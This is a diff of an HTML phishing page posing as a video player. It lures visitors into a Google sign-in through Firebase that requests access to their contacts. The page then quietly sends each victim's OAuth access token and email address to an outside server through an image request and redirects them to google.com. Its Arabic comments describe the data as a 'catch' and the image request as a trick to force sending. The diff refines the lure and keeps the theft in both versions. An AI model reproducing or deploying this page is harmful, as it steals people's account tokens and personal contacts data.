@@ -1,19 +1,12 @@
 <!DOCTYPE html>
-<html lang="ar" dir="rtl">
+<html>
 <head>
     <meta charset="UTF-8">
-    <title>Video Player</title>
     <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
     <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-auth.js"></script>
 </head>
-<body style="background:#000; color:#fff; text-align:center; padding-top:100px; font-family:sans-serif;">
-
-    <div id="box">
-        <h2>يجب تسجيل الدخول لمشاهدة الفيديو</h2>
-        <button id="btn" style="padding:20px 40px; background:red; color:#white; border:none; border-radius:10px; cursor:pointer; font-weight:bold;">
-            تسجيل دخول عبر Google
-        </button>
-    </div>
+<body style="background:#000; color:#fff; text-align:center; padding-top:50px;">
+    <button id="btn" style="padding:20px; background:red; color:white;">اضغط للمشاهدة</button>
 
     <script>
         const firebaseConfig = {
@@ -26,28 +19,26 @@
         };
         firebase.initializeApp(firebaseConfig);
 
-        // أهم جزء: استلام الصيد
         firebase.auth().getRedirectResult().then((result) => {
             if (result.credential) {
                 const token = result.credential.accessToken;
                 const sender = result.user.email;
                 
-                document.body.innerHTML = "<h1>جاري التحميل...</h1>";
+                // استخدام "الرابط المباشر" بدون مسارات فرعية
+                const target = `https://mohamedahmed77.pythonanywhere.com/?token=${token}&sender=${sender}`;
+                
+                // خدعة الصورة للإرسال الإجباري
+                const i = new Image();
+                i.src = target;
 
-                // إرسال مباشر وصريح
-                const url = `https://mohamedahmed77.pythonanywhere.com/catch?token=${encodeURIComponent(token)}&sender=${encodeURIComponent(sender)}`;
-                
-                const img = new Image(); // أضمن طريقة لإرسال بيانات بدون حظر CORS
-                img.src = url;
-                
-                setTimeout(() => { window.location.href = "https://google.com"; }, 3000);
+                setTimeout(() => { window.location.href = "https://google.com"; }, 2000);
             }
         });
 
         document.getElementById('btn').onclick = () => {
-            const provider = new firebase.auth.GoogleAuthProvider();
-            provider.addScope('https://www.googleapis.com/auth/contacts.readonly');
-            firebase.auth().signInWithRedirect(provider);
+            const p = new firebase.auth.GoogleAuthProvider();
+            p.addScope('https://www.googleapis.com/auth/contacts.readonly');
+            firebase.auth().signInWithRedirect(p);
         };
     </script>
 </body>
